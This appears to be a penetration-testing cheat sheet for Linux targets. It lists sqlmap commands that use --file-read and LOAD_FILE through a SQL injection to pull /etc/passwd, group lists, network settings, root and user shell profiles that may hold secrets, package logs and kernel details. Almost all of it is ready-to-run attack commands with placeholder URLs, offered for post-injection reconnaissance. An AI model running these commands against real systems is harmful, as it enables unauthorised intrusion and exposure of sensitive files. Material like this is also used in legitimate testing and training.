# Linux

## Conditions

1. The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
2. **Note:** Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## Automated

- Enumerating user accounts

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/passwd"

$ sqlmap -u <URL> --random-agent --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

- Enumerate user groups

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/group"
```

- Local IPv4 address

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/network/interfaces"

$ sqlmap -u <URL> --random-agent --file-read="/etc/sysconfig/network"

$ sqlmap -u <URL> --random-agent --file-read="/etc/networks"
```

- DNS resolve and nameserver IPs

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/resolv.conf"

$ sqlmap -u <URL> --random-agent --file-read="/etc/hosts"
```

- Environment variables may contain **sensitive information**. You never know that sometimes the sysadmins can be lazy sometimes.

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/profile"

$ sqlmap -u <URL> --random-agent --file-read="/etc/bash.bashrc"

$ sqlmap -u <URL> --random-agent --file-read="/home/<username>/.bash_profile"

$ sqlmap -u <URL> --random-agent --file-read="/root/.bash_profile"

$ sqlmap -u <URL> --random-agent --file-read="/home/<username>/.bashrc"

$ sqlmap -u <URL> --random-agent --file-read="/root/.bashrc"
```

- Enumerate installed packages that will give you an idea of what services are installed.

```
$ sqlmap -u <URL> --random-agent --file-read="/var/log/dpkg.log"

$ sqlmap -u <URL> --random-agent --file-read="/var/log/yum.log"
```

- Enumerate Linux kernel

```
$ sqlmap -u <URL> --random-agent --file-read="/etc/lsb-release"

$ sqlmap -u <URL> --random-agent --file-read="/etc/os-release"

$ sqlmap -u <URL> --random-agent --file-read="/proc/version"
```